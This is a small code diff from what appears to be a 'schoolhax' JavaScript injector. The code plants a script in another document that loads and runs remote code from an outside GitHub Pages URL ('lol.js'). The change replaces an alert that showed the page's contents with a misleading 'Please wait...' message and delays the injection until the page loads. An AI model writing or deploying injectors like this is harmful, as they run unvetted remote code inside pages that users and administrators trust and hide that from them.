@@ -6,7 +6,7 @@ window.onunload = function(){
       theScript = document.createElement('script');
     function injectThis() {
       try {
-        alert(document.body.innerHTML);
+        alert("Please wait...");
         var ele = document.createElement('script');
         ele.src = "https://jeffnjellybean.github.io/schoolhax/lol.js";
         document.body.appendChild(ele);
@@ -14,7 +14,7 @@ window.onunload = function(){
         alert(e.message);
       }
     }
-    theScript.innerHTML = '(' + injectThis.toString() + ')();';
+    theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
     theDoc.body.appendChild(theScript);
   }
 }
